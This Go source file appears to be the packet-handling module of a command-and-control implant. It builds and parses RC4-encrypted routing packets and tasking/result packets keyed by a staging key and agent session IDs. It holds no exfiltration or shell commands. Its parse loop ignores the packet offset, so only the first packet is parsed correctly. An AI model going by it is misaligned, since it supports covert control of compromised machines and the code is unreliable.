package comms

import (
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
)

type PacketHandler struct {
	MissedCheckins int
	Server         string
	StagingKey     []byte
	SessionID      string
	Aeskey         []byte
}

func (ph PacketHandler) BuildResponsePacket(taskingID int, packetData string, resultID int) []byte {
	buf := new(bytes.Buffer)

	binary.Write(buf, binary.LittleEndian, uint16(taskingID))
	binary.Write(buf, binary.LittleEndian, uint16(1))
	binary.Write(buf, binary.LittleEndian, uint16(1))
	binary.Write(buf, binary.LittleEndian, uint16(resultID))

	if packetData != "" {
		encodedData := base64.StdEncoding.EncodeToString([]byte(packetData))
		binary.Write(buf, binary.LittleEndian, uint32(len(encodedData)))
		buf.Write([]byte(encodedData))
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(0))
	}

	return buf.Bytes()
}

func (ph PacketHandler) BuildRoutingPacket(stagingKey []byte, sessionID string, meta int, encData []byte) []byte {
	buf := new(bytes.Buffer)
	buf.WriteString(sessionID)
	binary.Write(buf, binary.LittleEndian, uint8(4))
	binary.Write(buf, binary.LittleEndian, uint8(meta))
	binary.Write(buf, binary.LittleEndian, uint16(0))
	binary.Write(buf, binary.LittleEndian, uint32(len(encData)))
	data := buf.Bytes()

	rc4IV := make([]byte, 4)
	if _, err := io.ReadFull(rand.Reader, rc4IV); err != nil {
		// fmt.Println("Error generating RC4 IV:", err)
		return nil
	}

	key := append(rc4IV, stagingKey...)
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		// fmt.Println("Error creating RC4 cipher:", err)
		return nil
	}

	rc4EncData := make([]byte, len(data))
	cipher.XORKeyStream(rc4EncData, data)

	packet := append(rc4IV, rc4EncData...)
	packet = append(packet, encData...)

	return packet
}

func (ph PacketHandler) ParseRoutingPacket(stagingKey []byte, data []byte) (map[string][]interface{}, error) {
	results := make(map[string][]interface{})
	offset := 0

	for len(data)-offset >= 20 {
		RC4IV := binary.BigEndian.Uint32(data[:4])
		RC4IVBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(RC4IVBytes, RC4IV)

		routingKey := append(RC4IVBytes, stagingKey...)
		routingPacket, err := ph.rc4(routingKey, data[4:20])
		if err != nil {
			return nil, err
		}

		sessionID := string(routingPacket[:8])
		language := routingPacket[8]
		meta := routingPacket[9]
		additional := binary.LittleEndian.Uint16(routingPacket[10:12])
		length := binary.LittleEndian.Uint32(routingPacket[12:16])

		var encData []byte
		if length > 0 {
			encData = data[offset+20 : offset+20+int(length)]
		} else {
			encData = nil
		}

		results[sessionID] = []interface{}{language, meta, additional, encData}

		offset += 20 + int(length)
		if offset >= len(data) {
			break
		}
	}

	if len(results) == 0 {
		return nil, fmt.Errorf("no valid routing packets found")
	}

	return results, nil
}

func (ph PacketHandler) rc4(key []byte, data []byte) ([]byte, error) {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil, err
	}
	decrypted := make([]byte, len(data))
	cipher.XORKeyStream(decrypted, data)
	return decrypted, nil
}

func (ph PacketHandler) ParseTaskPacket(data []byte, offset int) (uint16, uint16, uint16, uint16, uint32, []byte, []byte, error) {
	if len(data) < offset+12 {
		return 0, 0, 0, 0, 0, nil, nil, fmt.Errorf("data too short to parse")
	}

	packetType := binary.LittleEndian.Uint16(data[offset : offset+2])
	totalPacket := binary.LittleEndian.Uint16(data[offset+2 : offset+4])
	packetNum := binary.LittleEndian.Uint16(data[offset+4 : offset+6])
	resultID := binary.LittleEndian.Uint16(data[offset+6 : offset+8])
	length := binary.LittleEndian.Uint32(data[offset+8 : offset+12])

	if len(data) < offset+12+int(length) {
		return 0, 0, 0, 0, 0, nil, nil, fmt.Errorf("data too short for specified length")
	}

	packetData := data[offset+12 : offset+12+int(length)]
	remainingData := data[offset+12+int(length):]

	return packetType, totalPacket, packetNum, resultID, length, packetData, remainingData, nil
}

func (ph PacketHandler) DecodeRoutingPacket(data []byte, stagingKey []byte, sessionID string) (encData []byte, err error) {
	packets, err := ph.ParseRoutingPacket(stagingKey, data)
	if err != nil {
		// fmt.Println("Error parsing routing packet:", err)
		return
	}

	for agentID, packet := range packets {
		if agentID == sessionID {
			// language := packet[0].(byte)
			// meta := packet[1].(byte)
			// additional := packet[2].(uint16)
			encData := packet[3].([]byte)

			// fmt.Printf("Language: %d, Meta: %d, Additional: %d\n", language, meta, additional)
			return encData, nil
		} else {
			// encodedData := base64.StdEncoding.EncodeToString(data)
			// fmt.Println("Queued data for other agents:", encodedData)
			return nil, nil
		}
	}
	return nil, nil
}
